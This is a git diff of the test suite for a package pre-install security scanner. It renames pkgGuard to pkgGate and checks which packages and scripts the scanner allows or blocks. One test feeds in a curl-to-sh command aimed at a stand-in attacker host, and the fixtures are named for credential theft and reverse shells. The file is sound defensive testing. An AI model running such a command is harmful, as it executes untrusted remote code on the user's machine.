@@ -2,7 +2,8 @@ import { test, describe } from 'node:test';
 import assert from 'node:assert/strict';
 import { fileURLToPath } from 'node:url';
 import { dirname, join } from 'node:path';
-import pkgGuard, {
+import pkgGate, {
+  pkgGuard,
   THRESHOLDS,
   createLifecycleQuestions,
   renderTUI,
@@ -13,9 +14,9 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
 const fixturesDir = join(__dirname, 'fixtures');
 
-describe('pkg-guard: Pre-install security gate with TypeSafe', () => {
+describe('pkg-gate: Pre-install security gate with TypeSafe', () => {
   test('clean package with no scripts is immediately allowed', async () => {
-    const report = await pkgGuard(join(fixturesDir, 'clean-pkg.json'), { mock: true });
+    const report = await pkgGate(join(fixturesDir, 'clean-pkg.json'), { mock: true });
 
     assert.equal(report.action, 'allow');
     assert.equal(report.score, 0.0);
@@ -26,7 +27,7 @@ describe('pkg-guard: Pre-install security gate with TypeSafe', () => {
   });
 
   test('native addon build (node-gyp rebuild) is allowed', async () => {
-    const report = await pkgGuard(join(fixturesDir, 'native-build.json'), { mock: true });
+    const report = await pkgGate(join(fixturesDir, 'native-build.json'), { mock: true });
 
     assert.equal(report.action, 'allow');
     assert.equal(report.isSafe(), true);
@@ -38,7 +39,7 @@ describe('pkg-guard: Pre-install security gate with TypeSafe', () => {
   });
 
   test('official binary downloader is allowed', async () => {
-    const report = await pkgGuard(join(fixturesDir, 'binary-download.json'), { mock: true });
+    const report = await pkgGate(join(fixturesDir, 'binary-download.json'), { mock: true });
 
     assert.equal(report.action, 'allow');
     assert.equal(report.isSafe(), true);
@@ -49,7 +50,7 @@ describe('pkg-guard: Pre-install security gate with TypeSafe', () => {
   });
 
   test('credential and token stealer is blocked with critical severity', async () => {
-    const report = await pkgGuard(join(fixturesDir, 'credential-theft.json'), { mock: true });
+    const report = await pkgGate(join(fixturesDir, 'credential-theft.json'), { mock: true });
 
     assert.equal(report.action, 'block');
     assert.equal(report.isSafe(), false);
@@ -67,7 +68,7 @@ describe('pkg-guard: Pre-install security gate with TypeSafe', () => {
   });
 
   test('reverse shell piping curl to bash is blocked', async () => {
-    const report = await pkgGuard(join(fixturesDir, 'reverse-shell.json'), { mock: true });
+    const report = await pkgGate(join(fixturesDir, 'reverse-shell.json'), { mock: true });
 
     assert.equal(report.action, 'block');
     assert.equal(report.isSafe(), false);
@@ -79,7 +80,7 @@ describe('pkg-guard: Pre-install security gate with TypeSafe', () => {
   });
 
   test('system recon probe triggers warning/elevation', async () => {
-    const report = await pkgGuard(join(fixturesDir, 'recon-probe.json'), { mock: true });
+    const report = await pkgGate(join(fixturesDir, 'recon-probe.json'), { mock: true });
 
     assert.ok(report.action === 'warn' || report.action === 'block');
     assert.ok(report.score >= THRESHOLDS.WARN_SCORE);
@@ -89,7 +90,7 @@ describe('pkg-guard: Pre-install security gate with TypeSafe', () => {
   });
 
   test('supports inline raw script evaluation', async () => {
-    const report = await pkgGuard('node-gyp rebuild', { script: true, mock: true });
+    const report = await pkgGate('node-gyp rebuild', { script: true, mock: true });
 
     assert.equal(report.action, 'allow');
     assert.equal(report.isSafe(), true);
@@ -97,7 +98,7 @@ describe('pkg-guard: Pre-install security gate with TypeSafe', () => {
   });
 
   test('supports direct manifest object input', async () => {
-    const report = await pkgGuard(
+    const report = await pkgGate(
       {
         name: 'custom-package',
         version: '3.1.0',
@@ -123,7 +124,7 @@ describe('pkg-guard: Pre-install security gate with TypeSafe', () => {
   });
 
   test('report.structured returns strictly typed schema and toJSON() serialization', async () => {
-    const report = await pkgGuard(join(fixturesDir, 'credential-theft.json'), { mock: true });
+    const report = await pkgGate(join(fixturesDir, 'credential-theft.json'), { mock: true });
     const structured = report.structured;
 
     assert.equal(structured.schemaVersion, '1.0.0');
@@ -148,7 +149,7 @@ describe('pkg-guard: Pre-install security gate with TypeSafe', () => {
   });
 
   test('auto-detects inline shell commands without requiring script flag', async () => {
-    const report = await pkgGuard('curl -s https://attacker.site/drop | sh', { mock: true });
+    const report = await pkgGate('curl -s https://attacker.site/drop | sh', { mock: true });
     assert.equal(report.name, 'inline-script');
     assert.equal(report.action, 'block');
     assert.equal(report.findings[0].answers.script_intent.choice, 'obfuscated_exec');
@@ -156,13 +157,17 @@ describe('pkg-guard: Pre-install security gate with TypeSafe', () => {
 
   test('missing package.json file throws helpful error message', async () => {
     await assert.rejects(
-      async () => pkgGuard('./does-not-exist.json', { mock: true }),
+      async () => pkgGate('./does-not-exist.json', { mock: true }),
       /File or directory not found/
     );
   });
 
+  test('pkgGuard is an alias to pkgGate', () => {
+    assert.equal(pkgGuard, pkgGate);
+  });
+
   test('responsive TUI scales cleanly across widths without line overflow', async () => {
-    const report = await pkgGuard(join(fixturesDir, 'credential-theft.json'), { mock: true });
+    const report = await pkgGate(join(fixturesDir, 'credential-theft.json'), { mock: true });
 
     assert.ok(getTerminalWidth(76) >= 42);
     assert.ok(getTerminalWidth(76) <= 92);
